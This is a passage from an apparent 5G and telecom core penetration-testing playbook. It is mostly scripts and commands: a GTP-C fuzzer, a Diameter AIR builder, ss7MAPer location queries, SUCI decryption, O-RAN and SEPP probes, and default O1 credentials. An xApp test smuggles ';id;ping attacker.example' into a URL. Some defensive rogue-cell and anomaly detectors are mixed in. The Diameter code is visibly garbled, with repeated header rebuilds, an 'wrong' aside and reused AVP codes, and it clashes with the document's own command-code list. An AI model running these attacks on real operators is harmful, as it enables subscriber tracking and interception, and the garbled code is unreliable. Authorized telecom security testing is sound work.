send(pkt, verbose=True)

# Capture response
# tshark -i any -f 'udp port 2123' -Y gtp -c 10
```

### 7.3 GTP-C v2 Fuzzer Skeleton

```python
#!/usr/bin/env python3
# gtpc-fuzz.py — basic mutation fuzzer for GTP-C v2
import random, struct, socket
from scapy.all import *
from scapy.contrib.gtp_v2 import GTPHeader

base_msg = bytes(GTPHeader(version=2, S=1, teid=0x01020304, seq=1, msg_type=32))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target = ('<sgw-ip>', 2123)

for i in range(1000):
    # Mutation strategy: byte flip, byte insertion, length field mutation
    mutation = bytearray(base_msg)
    pos = random.randint(0, len(mutation) - 1)
    mutation[pos] ^= random.randint(1, 255)
    if random.random() < 0.3:
        # Mutate length field (bytes 2-3)
        struct.pack_into('!H', mutation, 2, random.randint(0, 0xFFFF))
    s.sendto(bytes(mutation), target)
    time.sleep(0.01)

# Monitor SGW for crashes (logs, SCTP associations, etc.)
#   docker logs sgw | tail -50
```

---

## 8. Diameter (S6a, Sh, Rx) — Legacy Roaming Testing

### 8.1 S6a (MME/HSS) Capture

```bash
# S6a is on SCTP 3868 between MME and HSS in 4G/LTE
sudo tshark -i any -f 'sctp port 3868' -Y diameter -w /tmp/s6a.pcap

# Identify S6a messages
tshark -r /tmp/s6a.pcap -Y diameter -T fields \
  -e frame.time -e diameter.cmd.code -e diameter.cmd.flags.request \
  -e diameter.Session-Id 2>/dev/null | head -30
# Diameter command codes for S6a:
#   316 = Update-Location-Request (ULR) / Answer (ULA)
#   320 = Cancel-Location-Request (CLR) / Answer (CLA)
#   321 = Authentication-Information-Request (AIR) / Answer (AIA)
#   838909 = Insert-Subscriber-Data-Request (IDR) / Answer (IDA)
#   838908 = Delete-Subscriber-Data-Request (DSR) / Answer (DSA)
#   322 = Purge-UE-Request (PUR) / Answer (PUA)
#   323 = Reset-Request (RSR) / Answer (RSA)
#   324 = Notify-Request ( NOR) / Answer (NOA)
```

### 8.2 Diameter AIR (Authentication Information Request)

```python
#!/usr/bin/env python3
# diameter-air-poc.py — construct a Diameter AIR for a test IMSI
# Legal: operator-side engagement with explicit roaming-partner authorization only.
# Diameter AIR retrieves the authentication vector (RAND, AUTN, XRES, KASME) for a subscriber.
import socket, struct

# This PoC uses a minimal hand-rolled Diameter message.
# For production use, use seagull (Linux) or httomo-diameter.
# Reference: 3GPP TS 29.272 (S6a/S6d).

# Diameter header: version=1, msg_length, flags, cmd_code, app_id, hop_by_hop_id, end_to_end_id
# Command code 318 = Authentication-Information (AIR/AIA)
# Application id 16777251 = S6a/S6d

def build_air(imsi_digits, origin_host, origin_realm, dest_realm):
    # AVPs encoded as: code(4), flags(1), length(3), then value padded to 4-byte boundary
    def avp(code, value, flags=0b01000000, vendor_id=None):
        data = value
        vbit = 0x80 if vendor_id else 0
        hdr = struct.pack('!IB', code, flags | vbit)
        hdr += struct.pack('!I', len(data) + (8 if not vendor_id else 12))[1:]  # 3-byte length
        if vendor_id:
            hdr += struct.pack('!I', vendor_id)
        pad = (4 - (len(data) % 4)) % 4
        return hdr + data + b'\x00' * pad

    session_id = b'sess-' + str(1).encode().ljust(8, b'0')
    origin_host_avp = avp(1, origin_host.encode())
    origin_realm_avp = avp(2, origin_realm.encode())
    dest_realm_avp = avp(3, dest_realm.encode())
    dest_host_avp = avp(1, b'hss.example.net')  # use HSS FQDN
    # AVP 1 (User-Name) = IMSI
    user_name = avp(1, imsi_digits.encode())
    # AVP 1414 (Visited-PLMN-Id) = MCC/MNC packed BCD
    plmn = avp(1414, b'\x00\xf1\x10')  # MCC 001, MNC 01

    body = (avp(263, session_id) + origin_host_avp + origin_realm_avp +
            dest_realm_avp + user_name + plmn)

    # Diameter header
    cmd_code = 318
    app_id = 16777251
    flags = 0x80  # Request
    hbh = 0x12345678
    e2e = 0x87654321
    msg_len = 20 + len(body)
    hdr = struct.pack('!IBBHI', 1, msg_len >> 16 & 0xFF, msg_len & 0xFFFF, 0, 0)  # placeholder
    # Proper construction:
    hdr = struct.pack('!B', 1)                       # version
    hdr += struct.pack('!I', msg_len)[1:]             # 3-byte length
    hdr += struct.pack('!BBB', flags, cmd_code >> 16 & 0xFF, 0)  # wrong — let's use I-pack:
    hdr = struct.pack('!B', 1)
    hdr += struct.pack('!I', msg_len)[1:]
    hdr += struct.pack('!BBB', flags, (cmd_code >> 16) & 0xFF, 0)
    # Simplification — use full struct for clarity:
    hdr = struct.pack('!B', 1)                       # version=1
    hdr += struct.pack('!I', msg_len)[1:]             # length (3 bytes)
    hdr += bytes([flags, 0, 0])                       # flags, then cmd_code split
    hdr += struct.pack('!H', cmd_code & 0xFFFF)
    hdr += struct.pack('!I', app_id)
    hdr += struct.pack('!I', hbh)
    hdr += struct.pack('!I', e2e)

    return hdr + body

# Best practice: use httomo_diameter or seagull for actual S6a testing
# This PoC is illustrative only.
```

### 8.3 Seagull S6a Scenario (Operator Tool)

```bash
# Seagull is the canonical open-source Diameter load tester
sudo apt install -y seagull

# Scenario directory: /usr/share/seagull/diameter-env/
# S6a scenario for AIR
cat > /tmp/s6a-air.xml <<EOF
<?xml version="1.0" encoding="ISO-8859-1"?>
<scenario>
  <counter>
    <counterdef name="HbH-counter" init="1000"> </counterdef>
    <counterdef name="EtE-counter" init="2000"> </counterdef>
    <counterdef name="session-counter" init="0"> </counterdef>
  </counter>
  <init>
    <send channel="channel-1">
      <command name="AIR">
        <avp name="Session-Id" value="value_is_replaced"> </avp>
        <avp name="Auth-Session-State" value="1"> </avp>
        <avp name="Origin-Host" value="mme.example.net"> </avp>
        <avp name="Origin-Realm" value="example.net"> </avp>
        <avp name="Destination-Realm" value="home.example.net"> </avp>
        <avp name="User-Name" value="001010000000001"> </avp>
        <avp name="Requested-EUTRAN-Authentication-Info">
          <avp name="Number-Of-Requested-Vectors" value="1"> </avp>
          <avp name="Immediate-Response-Preferred" value="1"> </avp>
        </avp>
        <avp name="Visited-PLMN-Id" value="001F110"> </avp>
      </command>
    </send>
    <receive channel="channel-1">
      <command name="AIA">
      </command>
    </receive>
  </init>
</scenario>
EOF

# Run with seagull
seagull -conf /etc/seagull/conf-diameter.xml \
  -dico /usr/share/seagull/dictionary/dictionary.xml \
  -scen /tmp/s6a-air.xml
```

### 8.4 Detecting Unauthorized AIR/ULR (Defensive)

```bash
# Defensive: log every Diameter S6a message on the HSS and alert on anomalies
# Anomaly 1: visited-network PLMN ID does not match any roaming agreement
# Anomaly 2: ULR for an IMSI that has not registered on any visited network recently
# Anomaly 3: high rate of AIR from a single peer

# Sample tshark filter to extract S6a requests with anomalous Visited-PLMN-Id
tshark -r /tmp/s6a.pcap -Y 'diameter.cmd.code == 318 && diameter.cmd.flags.request == 1' \
  -T fields -e frame.time -e diameter.User-Name \
  -e diameter.Visited-PLMN-Id 2>/dev/null | head -50

# Map Visited-PLMN-Id to country/operator and compare against roaming agreements
# Reference: GSMA IR.21 roaming agreement database
```

---

## 9. SS7 (MAP) — Historical Context + Legal Caveats

> **Legal caveat (CRITICAL)**: SS7/MAP testing against a production operator is illegal in most jurisdictions without explicit authorization. This section documents historical context and lab reproduction only. For operator-side SS7 firewall validation, use the GSMA FS-IS coordinated disclosure process.

### 9.1 Historical Context

- **2008**: Tobias Engel at 24C3 demonstrates SS7-based location tracking (Provide Subscriber Info, PSI).
- **2014**: Karsten Nohl at 31C3 demonstrates SS7-based call/SMS interception of multiple national government officials (Cabinet-level).
- **2016**: Nohl & researchers at BlackHat demonstrate global SS7 exploitation affecting customers of every major operator.
- **2017+**: Positive Technologies publishes similar findings for Diameter (4G roaming).
- **2019**: GSMA publishes FS.32 SS7 recommendations; operators begin deploying SS7 firewalls.
- **2020+**: 5G SEPP (Security Edge Protection Proxy) for N32 roaming — the third attempt at the same problem.
- **2023**: Positive Technologies "5G Vulnerabilities" report (BlackHat / HITB) documents SEPP misconfigurations in deployed 5G cores.

### 9.2 ss7MAPer (Lab Reproduction)

```bash
# ss7MAPer is the canonical open-source SS7 MAP testing tool
# Repository: github.com/ernw/ss7MAPer (also maintained by Positive Technologies)
git clone https://github.com/ernw/ss7MAPer /opt/ss7MAPer
cd /opt/ss7MAPer
sudo apt install -y libboost-all-dev libssl-dev libsctp-dev
cmake .
make

# Lab mode: requires an SCTP peer that speaks SS7/M3UA/SCCP/MAP
# In practice, ss7MAPer is used against SS7 firewalls in operator lab engagements
./ss7MAPer --help
```

### 9.3 MAP Messages of Interest (3GPP TS 29.002)

| MAP Operation | Code | Purpose | Attack Use |
|---------------|------|---------|-----------|
| updateLocation | 2 | VLR informs HLR of subscriber location | Tracking, account takeover |
| cancelLocation | 3 | HLR tells VLR to drop subscriber | DoS (forced re-attach) |
| provideRoamingNumber | 4 | HLR provides MSRN to GMSC | Call interception setup |
| provideSubscriberInfo | 54 | HLR returns location/MSISDN | Location tracking |
| anyTimeInterrogation | 71 | gsmSCF queries subscriber state | Location tracking |
| sendAuthenticationInfo | 56 | VLR retrieves auth vectors | Subscriber impersonation |
| insertSubscriberData | 7 | HLR pushes subscriber profile | Privilege escalation (profile injection) |
| deleteSubscriberData | 8 | HLR removes subscriber profile | Service DoS |
| sendRoutingInfo | 22 | GMSC retrieves routing | Call interception |

### 9.4 Lab SS7 Reproduction (Closed Lab Only)

```bash
# Closed-lab reproduction: YateUCN or OsmoHLR/OsmoMSC with SS7/M3UA
git clone https://gitea.osmocom.org/osmo-hlr /opt/osmo-hlr
cd /opt/osmo-hlr
autoreconf -fi
./configure
make
./src/osmo-hlr -c /etc/osmocom/osmo-hlr.cfg &

# OsmoMSC for SS7 MAP peer
git clone https://gitea.osmocom.org/osmo-msc /opt/osmo-msc
cd /opt/osmo-msc
autoreconf -fi && ./configure && make
./src/osmo-msc -c /etc/osmocom/osmo-msc.cfg &

# Use ss7MAPer against the OsmoHLR lab
/opt/ss7MAPer/ss7MAPer \
  --local-ip 127.0.0.1 \
  --local-pointcode 1.2.3 \
  --remote-ip 127.0.0.1 \
  --remote-pointcode 1.2.4 \
  --remote-port 2905 \
  --operation provideSubscriberInfo \
  --imsi 001010000000001

# Expected (vulnerable HLR): PSI Response with subscriber location
# Expected (hardened HLR): reject or no response
```

### 9.5 SS7 Firewall Validation Checklist (Operator-Side)

| # | Check | Expected (Hardened) | Tool |
|---|-------|---------------------|------|
| 1 | MAP from non-roaming peer | Reject | ss7MAPer |
| 2 | MAP for non-roaming subscriber | Reject | ss7MAPer |
| 3 | Global Title screening | Enforce | Operator GT table |
| 4 | Source SCCP address validation | Enforce | SS7 firewall |
| 5 | MAP operation allowlist | Enforce (PSI/ATI for self only) | SS7 firewall |
| 6 | Rate limiting per peer | Enforce | SS7 firewall |
| 7 | Message type for subscriber not registered to sender | Reject | Operator correlation |

---

## 10. IMSI Catcher Detection — Stingray Detection Workflow

### 10.1 Passive Survey with SDR

```bash
# Survey the cellular downlink band for 5G SSB and LTE PSS/SSS
# With USRP B210 or BladeRF 2.0 micro:
uhd_usrp_probe
osmocom_fft -f 2.155e9 -s 10e6 &  # LTE B1 downlink (2.110-2.170 GHz)
# Capture for spectrum analysis

# 5G cell scanner (srsRAN or gr-5g)
sudo apt install -y gr-lte   # LTE scanner
# srsRAN 4G has a scanner: srsran_scanner
cd /opt/srsran_4g/build
./srsran/scanner/srsran_scanner --band 3 --freq_start 1.805e9 --freq_end 1.880e9
# Output: PLMN, cell ID, RSRP/RSRQ, broadcast SIB1, TAC

# Capture the SIB1 of every detected cell
# SIB1 contains: PLMN, TAC, cell ID, tracking area — used to detect rogue cells
```

### 10.2 Active IMSI Catcher Trigger (5G SUCI Pattern)

```bash
# 5G IMSI catchers trigger the UE to reveal either:
#   (a) cleartext SUPI — only if the operator's scheme is "null scheme" (rare in production)
#   (b) ECIES-encrypted SUCI — but the catcher can still track via SUCI stability

# Capture the random access + RRC setup with srsRAN or gr-SDR
# Focus on the RegistrationRequest message at NAS layer
tshark -r /tmp/rrc-capture.pcap -Y 'nas_5gs.message_type == 0x41' \
  -T fields -e frame.time -e nas_5gs.mobile_identity.type \
  -e nas_5gs.mobile_identity.suci.protection_scheme \
  -e nas_5gs.mobile_identity.suci.home_network_id.mcc \
  -e nas_5gs.mobile_identity.suci.home_network_id.mnc \
  -e nas_5gs.mobile_identity.suci.scheme_output

# SUCI protection schemes (3GPP TS 33.501 §C.3):
#   0 = Null scheme (SUPI in cleartext — vuln!)
#   1 = ECIES using operator's profile A (Curve25519)
#   2 = ECIES using operator's profile B (Curve25519)
```

### 10.3 Detecting Rogue Base Stations (Defensive)

```python
#!/usr/bin/env python3
# rogue-cell-detector.py
# Anomaly detection on captured SIB1 from a cellular survey
import json, sys
from collections import Counter

# Inputs: list of detected cells from srsRAN scanner
# Each cell: {plmn, tac, cell_id, rsrp, rsrq, freq, band, pci}
detected = json.load(open(sys.argv[1]))

# Operator's planned inventory (legitimate cells)
known = json.load(open('planned_inventory.json'))
known_keys = {(c['plmn'], c['tac'], c['cell_id']) for c in known}

# Detect cells not in the planned inventory
rogues = [c for c in detected if (c['plmn'], c['tac'], c['cell_id']) not in known_keys]
print(f'Detected {len(rogues)} cells NOT in planned inventory:')
for r in rogues:
    print(f"  PLMN={r['plmn']} TAC={r['tac']} CellID={r['cell_id']} "
          f"PCI={r['pci']} RSRP={r['rsrp']}dBm Band={r['band']} Freq={r['freq']/1e6}MHz")

# Detect duplicate PCIs (PCI confusion — classic rogue cell signature)
pci_counts = Counter(c['pci'] for c in detected)
dup_pcis = {pci for pci, n in pci_counts.items() if n > 1}
print(f'\nPCIs used by multiple cells: {dup_pcis}')

# Detect cells with PLMN not matching the operator
op_plmns = {'310260', '310410'}  # T-Mobile, AT&T
foreign = [c for c in detected if c['plmn'] not in op_plmns]
print(f'\nCells with non-operator PLMN: {len(foreign)}')
for f in foreign:
    print(f"  PLMN={f['plmn']} CellID={f['cell_id']}")
```

### 10.4 AIMSICD (Android Field Detection)

```bash
# AIMSICD: Android IMSI Catcher Detector
# github.com/SecUpwN/Android-IMSI-Catcher-Detector
# Install on rooted Android device with Qualcomm baseband

# AIMSICD detects:
#   - Cell ID not in operator's database (OpenCellID)
#   - PLMN mismatch with SIM
#   - LAC/TAC changes mid-session
#   - Force-attach from 4G/5G to 2G (IMSI catcher downgrade attack)
#   - Silent SMS (used for tracking)
#   - Baseband anomalies (Qualcomm DIAG)

# Export AIMSICD logs and analyze
adb pull /sdcard/AIMSICD/ /tmp/aimsicd-logs/
# logs contain: cell_id, lac, mnc/mcc, signal, detection events
```

---

## 11. 5G AIA/ARIA Privacy — SUCI/SUPI Resolution Attacks

### 11.1 Capture and Decode SUCI

```bash
# SUCI (Subscriber Concealed Identifier) is the ECIES-encrypted SUPI
# Sent on the air in the RegistrationRequest NAS message
# Format: <suci-type> <mcc-mnc> <routing-indicator> <protection-scheme> <home-net-pubkey-id> <scheme-output>

# Extract SUCI from a NAS capture
tshark -r /tmp/n2.pcap -Y 'nas_5gs.message_type == 0x41' \
  -T fields -e nas_5gs.mobile_identity.suci.protection_scheme \
  -e nas_5gs.mobile_identity.suci.home_network_id.mcc \
  -e nas_5gs.mobile_identity.suci.home_network_id.mnc \
  -e nas_5gs.mobile_identity.suci.home_network_public_key_id \
  -e nas_5gs.mobile_identity.suci.scheme_output 2>/dev/null

# Typical output:
#   1 001 01 0 <hex-encoded ciphertext>
# Protection scheme 1 = ECIES Profile A (3GPP TS 33.501 §C.3.1)
# Protection scheme 2 = ECIES Profile B
# Protection scheme 0 = Null scheme (SUPI in cleartext)
```

### 11.2 ECIES SUCI Decryption (Operator-Side)

```python
#!/usr/bin/env python3
# suci-decrypt-poc.py
# Decrypt a captured SUCI using the operator's home network private key.
# Legal: operator-side engagement only. This reproduces the Alonso et al.
# (2021) class of attack on operators with weak or known home-network keys.
# Reference: Alonso, "5G AIA/ARIA" paper.
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64, sys, os

# Operator home network private key (engagement-scoped, never in source)
HOME_NET_PRIVATE_KEY_HEX = os.environ['HOME_NET_PRIVATE_KEY']  # 32-byte X25519 private key

def decrypt_suci_scheme1(captured_scheme_output_hex, ephemeral_pubkey_hex, ciphertext_hex, mac_tag_hex):
    private_key = X25519PrivateKey.from_private_bytes(bytes.fromhex(HOME_NET_PRIVATE_KEY_HEX))
    ephemeral_pub = X25519PublicKey.from_public_bytes(bytes.fromhex(ephemeral_pubkey_hex))
    shared_key = private_key.exchange(ephemeral_pub)

    # Derive K_enc (16 bytes) and K_mac (32 bytes) per 3GPP TS 33.501 Annex C.3
    hkdf_enc = HKDF(algorithm=hashes.SHA256(), length=16, salt=None, info=b'SUCI-profile-a-enc')
    k_enc = hkdf_enc.derive(shared_key)
    hkdf_mac = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'SUCI-profile-a-mac')
    k_mac = hkdf_mac.derive(shared_key)

    # Decrypt the SUPI (AES-GCM with the derived key)
    nonce = b'\x00' * 12  # SUCI uses zero-nonce
    cipher = Cipher(algorithms.AES(k_enc), modes.GCM(nonce, bytes.fromhex(mac_tag_hex)))
    decryptor = cipher.decryptor()
    supi = decryptor.update(bytes.fromhex(ciphertext_hex)) + decryptor.finalize()
    return supi

# Usage:
#   python3 suci-decrypt-poc.py <ephemeral_pubkey_hex> <ciphertext_hex> <mac_tag_hex>
# Output: IMSI in cleartext
# Note: requires the operator's home network private key, which is held by the UDM.
# This PoC is used to validate that an operator's deployed key is not weak/known.
```

### 11.3 Weak Public Key Detection (Defensive)

```bash
# Check the operator's published home network public key against known weak keys
# Reference: 3GPP TS 33.501 §C.3.2 — known weak curve / small subgroup attacks

# Operators publish the home network public key in the SIM profile (USIM)
# Extract via Qualcomm DIAG or via SIM Application Toolkit
# Extracted public key bytes (X25519 32 bytes or EC P-256 64 bytes)

python3 - <<'EOF'
# Check the published public key against the list of known weak keys
# (small-subgroup attackable X25519 keys, low-order points)
weak_keys = {
    # List of low-order X25519 points (Bernstein et al.)
    bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000'),
    bytes.fromhex('0100000000000000000000000000000000000000000000000000000000000000'),
    # ... (full list in 3GPP TS 33.501 Annex C.5)
}

with open('home_net_pubkey.bin', 'rb') as f:
    pub = f.read()
if pub in weak_keys:
    print('CRITICAL: Home network public key is a known weak key')
else:
    print('OK: Home network public key is not in known weak list')
EOF
```

---

## 12. SMS Interception — NAS Layer SMS Analysis

### 12.1 Capture NAS SMS

```bash
# In 5G, SMS is delivered over NAS (NAS-SMS) by default — not over SGs/SGs as in 4G
# Capture N1 (NAS) messages between UE and AMF
sudo tshark -i any -f 'sctp port 38412' -Y 'nas-5gs || ngap' -w /tmp/nas-sms.pcap

# Filter for NAS SMS messages (RP-DL, RP-UL)
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5b || nas_5gs.message_type == 0x5c' \
  -T fields -e frame.time -e _ws.col.Protocol -e _ws.col.Info

# 5G NAS message types (3GPP TS 24.501 §9.7):
#   0x5b = Downlink NAS Transport (carries SMS DL)
#   0x5c = Uplink NAS Transport (carries SMS UL)
#   0x5d = 5GMM Status
#   0x29 = Configuration Update Command (5G-GUTI reallocation)
```

### 12.2 Decode RP-DL SMS Payload

```bash
# Once NAS security is active (after Security Mode Command), SMS is encrypted
# To decode: need the NAS security keys (operator-side engagement)

# With NAS keys (Kamf or derived K_NAS_enc, K_NAS_int):
# Use Wireshark's 5G NAS decrypt feature
# Edit > Preferences > Protocols > NAS-5GS > UE Security Capabilities
# Enter K_NAS_enc / K_NAS_int and NAS COUNT

# Without keys: identify message structure only
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5b' -V | grep -A20 'SMS\|RP-DL\|CP-DL'

# Extract SMS PDU type (RP-DL User Data)
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5b' \
  -T fields -e sgsap.msg_type 2>/dev/null
```

### 12.3 Silent SMS Detection

```bash
# Silent SMS: SMS that doesn't display on the UE, used for tracking (paging)
# Detection: SMS with empty TPDU user data, or TP-DCS indicating silent
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5b' \
  -T fields -e frame.time -e gsm_map.sms.tpdu_type 2>/dev/null

# AIMSICD logs silent SMS — pull the logs
adb pull /sdcard/AIMSICD/Detection_Log.db /tmp/detection.db
sqlite3 /tmp/detection.db 'SELECT * FROM silent_sms ORDER BY timestamp DESC LIMIT 10;'
```

### 12.4 NAS Encryption Verification

```bash
# Verify NAS security is active by checking the Security Mode Command
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5e' -V | head -50
# 0x5e = Security Mode Command
# Check: Selected NAS Security Algorithm (NEA0/NEA1/NEA2/NEA3, NIA0/NIA1/NIA2/NIA3)
# NEA0 / NIA0 = NULL ciphering / integrity — VULNERABLE

# Alert if NEA0 (null ciphering) is selected
tshark -r /tmp/nas-sms.pcap -Y 'nas_5gs.message_type == 0x5e && nas_5gs.nas_security_algorithms.ciphering == 0' \
  -V | head -30
```

---

## 13. O-RAN Security — O1/O2/E2 Interfaces

### 13.1 O-RAN Architecture Refresher

The O-RAN Alliance architecture splits the gNB into:

- **O-RU** (Radio Unit) — RF and low-PHY; connected via Open Fronthaul (7-2x split) to O-DU
- **O-DU** (Distributed Unit) — high-PHY, MAC, RLC
- **O-CU-CP** (Centralized Unit Control Plane) — RRC
- **O-CU-UP** (Centralized Unit User Plane) — SDAP, PDCP
- **Near-RT RIC** (near Real-Time RAN Intelligent Controller) — E2 interface
- **Non-RT RIC** (in SMO) — A1 interface

Interfaces:
- **O1** — Operations (NETCONF/YANG, REST) to O-RU/O-DU/O-CU
- **O2** — Cloud-native (Helm, Kubernetes) for O-Cloud deployment
- **E2** — near-RT RIC to O-DU/O-CU (over SCTP, e2ap)
- **A1** — non-RT RIC to near-RT RIC (over HTTPS)
- **Open Fronthaul** — O-RU to O-DU (CPRI/eCPRI over UDP)

### 13.2 O1 (NETCONF) Discovery

```bash
# O1 typically uses NETCONF over SSH (port 830) or RESTCONF over HTTPS (port 443)
nmap -p 830,443,80,22 <o-ru-ip> <o-du-ip>

# Test NETCONF login
ssh netconf@<o-ru-ip> -p 830 -s netconf
# Once connected, send hello + get request:
cat <<EOF | nc -w 5 <o-ru-ip> 830
<?xml version="1.0" encoding="UTF-8"?>
<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <capabilities>
    <capability>urn:ietf:params:netconf:base:1.0</capability>
  </capabilities>
</hello>
]]>]]>
<?xml version="1.0" encoding="UTF-8"?>
<rpc message-id="1" xmlns="urn:ietf:params:netconf:base:1.0">
  <get/>
</rpc>
]]>]]>
EOF
```

### 13.3 O1 Default Credentials Check

```bash
# Common O-RAN O1 default credentials (research-known, not for production use)
# Vendor / Default username / password (CHANGE IMMEDIATELY IN LAB)
# - Open: admin / admin
# - Open: root / (blank)
# These defaults exist in early O-RAN reference implementations.

# Always use authorized engagement credentials
sshpass -p 'REPLACE_WITH_YOUR_PASSWORD' ssh netconf@<o-ru-ip> -p 830 -s netconf
```

### 13.4 O2 (Helm Chart) Discovery

```bash
# O2 interface is a REST API to the O-Cloud (Kubernetes cluster manager)
curl -sk -v https://<o-cloud-ip>:4443/o2ims-infrastructureInventory/v1/ \
  -H "Authorization: Bearer REPLACE_WITH_YOUR_TOKEN"
# Expected: JSON listing of cluster resources, deployment descriptors

# Check for exposed Helm charts
curl -sk https://<o-cloud-ip>:4443/o2ims-infrastructureInventory/v1/deploymentManagers | jq

# Common findings in early O-RAN O2 deployments:
#   - Exposed /metrics endpoint with cluster details
#   - Helm chart stored in unauthenticated registry
#   - RBAC disabled on the O-Cloud cluster
```

### 13.5 E2 (near-RT RIC) Interface

```bash
# E2 interface runs over SCTP with e2ap (E2 Application Protocol)
# Default SCTP port: 36422 (3GPP TS 48.014)
nmap -sSU -p 36422 --script=sctp-init <near-rt-ric-ip>

# Capture E2AP
sudo tshark -i any -f 'sctp port 36422' -Y e2ap -w /tmp/e2ap.pcap
tshark -r /tmp/e2ap.pcap -Y e2ap -V | head -100

# E2AP message types:
#   RIC Subscription Request / Response
#   RIC Indication
#   RIC Control
#   E2 Setup Request / Response
```

### 13.6 RIC xApp Vulnerability Testing

```python
#!/usr/bin/env python3
# ric-xapp-test.py — test a deployed xApp in near-RT RIC
# xApps are containerized apps deployed in the RIC; common issues:
#   - Unauthenticated REST API on the xApp itself
#   - Insecure deserialization of E2AP payloads
#   - Default admin password on the xApp dashboard
import requests, sys

xapp_url = sys.argv[1]  # e.g. 'http://<ric-ip>:32080'
# Test unauthenticated access to the xApp dashboard
r = requests.get(f'{xapp_url}/admin', timeout=5)
print(f'GET /admin: {r.status_code}')
if r.status_code == 200:
    print('CRITICAL: xApp admin endpoint is unauthenticated')

# Test E2 stats endpoint
r = requests.get(f'{xapp_url}/e2stats', timeout=5)
print(f'GET /e2stats: {r.status_code}')
if r.status_code == 200:
    print('CRITICAL: E2 stats endpoint is unauthenticated — leaks cell/subscriber data')

# Test for R-ID injection (xApps often accept RAN ID in URL)
r = requests.get(f'{xapp_url}/cell/1;id;ping%20attacker.example', timeout=5)
print(f'GET /cell/<id>: {r.status_code}')
```

---

## 14. Roaming Abuse — SEPP / Border Gateway Testing

### 14.1 SEPP Architecture

The Security Edge Protection Proxy (SEPP) sits at the boundary between the visited and home 5G cores for N32 roaming. It provides:

- Topology hiding (encrypts sensitive NF/IP info)
- Message filtering (per roaming agreement rules)
- Integrity protection (JOSE: JWS for integrity, JWE for confidentiality)
- Rate limiting per roaming peer

N32 interface has two variants:
- **N32-c** (control) — handshake, capability negotiation
- **N32-f** (forwarding) — actual message relay

### 14.2 SEPP Discovery

```bash
# SEPP typically exposes HTTPS on port 443 (or custom)
nmap -p 443,8443,3128 <sepp-ip>

# Fingerprint the SEPP implementation
curl -sk -v https://<sepp-ip>:443/ -I 2>&1 | head -20
curl -sk https://<sepp-ip>:443/nsepp-n32c/v1/exchange-caps 2>&1 | jq
# Expected: 401 if auth required, 200 with capabilities if unauthenticated

# Common SEPP vendors:
#   Ericsson: Cloud SEPP (specific headers)
#   Nokia: SEPP (specific user-agent)
#   Mavenir: Open SEPP (open-source based)
```

### 14.3 N32-c Handshake PoC

```bash
# Initiate N32-c Exchange Capability Request
curl -sk -X POST https://<sepp-ip>:443/nsepp-n32c/v1/exchange-caps \
  -H "Content-Type: application/json" \
  -d '{
    "sendingSEPPId": "sepp.example.net",
    "receivingSEPPId": "sepp.visited.net",
    "plmnId": {"mcc": "001", "mnc": "01"},
    "supportedFeatures": "ffff",
    "seppCapabilities": {
      "n32": ["TLS", "PRINS"],
      "cipher": ["AES_256_GCM"]
    }
  }'

# Capture the response to identify the SEPP's supported cipher suites
# Attack surface:
#   - Weak PRINS configuration (no mutual TLS, no IPX certificate validation)
#   - Permissive cipher list (allowing NULL cipher)
#   - Missing integrity on N32-f (JWS bypassed)
```

### 14.4 N32-f Forwarding Test

```python
#!/usr/bin/env python3
# sepp-n32f-forward-test.py
# Test whether the SEPP forwards unauthorized messages between visited/home cores
import requests, sys

sepp = sys.argv[1]
headers = {'Content-Type': 'application/json'}

# Construct an unauthorized UDR query (would normally be rejected by SEPP)
# Reference: Positive Technologies 5G research (2023)
body = {
    "nfType": "UDR",
    "operation": "GET",
    "target": "/nudr-dr/v1/subscription-data/imsi-001010000000001/authentication-data",
    "sourceNFType": "AMF"
}

r = requests.post(f'https://{sepp}/nsepp-n32f/v1/relay',
                  headers=headers, json=body, verify=False, timeout=10)
print(f'N32-f relay: {r.status_code}')
if r.status_code == 200:
    print('CRITICAL: SEPP forwarded unauthorized UDR query across roaming boundary')
elif r.status_code == 403:
    print('OK: SEPP rejected unauthorized query')
```

### 14.5 Topology Hiding Verification

```bash
# Capture N32-f traffic and verify that internal IPs are hidden
sudo tshark -i any -f 'host <sepp-ip> and tcp port 443' -w /tmp/n32f.pcap
tshark -r /tmp/n32f.pcap -Y http2 -V | grep -E '10\.|172\.|192\.168\.'
# Expected: no internal IP addresses visible (topology hiding enforced)
# If internal IPs are visible: topology hiding is NOT enforced (vuln)
```

---

## 15. Network Slice Isolation Tests

### 15.1 Slice Architecture

5G network slicing allows multiple logical networks on shared infrastructure, each identified by S-NSSAI (Single Network Slice Selection Assistance Information):

- **SST** (Slice/Service Type) — 1 byte (eMBB=1, URLLC=2, MIoT=3)
- **SD** (Slice Differentiator) — 3 bytes (operator-defined)

Key components for slice isolation:
- **NSSF** (Network Slice Selection Function) — selects AMF and slice
- **AMF** — supports slice
- **NRF** — per-slice NRF or shared
- **UPF** — per-slice UPF (typically)

### 15.2 Slice Enumeration

```bash
# List slices advertised by the NSSF
curl -sk "https://<nssf-ip>:443/nnssf-nsselection/v1/network-slice-instances" | jq

# List slices configured in NRF
curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?slice-info=1" | jq

# Map: slice -> NFs
for slice in 1 2 3; do
  echo "=== Slice SST=$slice ==="
  curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?slice-info=$slice" \
    | jq -r '.nfInstance[].nfType' | sort -u
done
```

### 15.3 Slice Cross-Talk Test

```python
#!/usr/bin/env python3
# slice-crosstalk-test.py
# Test whether a subscriber in slice A can access NFs in slice B
# Expected: rejected by NRF or NF-side slice check
import requests, sys

nrf = sys.argv[1]
attacker_slice_sst = 1  # eMBB
target_slice_sst = 2    # URLLC

# Attempt to discover NFs in the target slice using attacker's credentials
r = requests.get(f'https://{nrf}:7777/nnrf-nfm/v1/nf-instances?slice-info={target_slice_sst}',
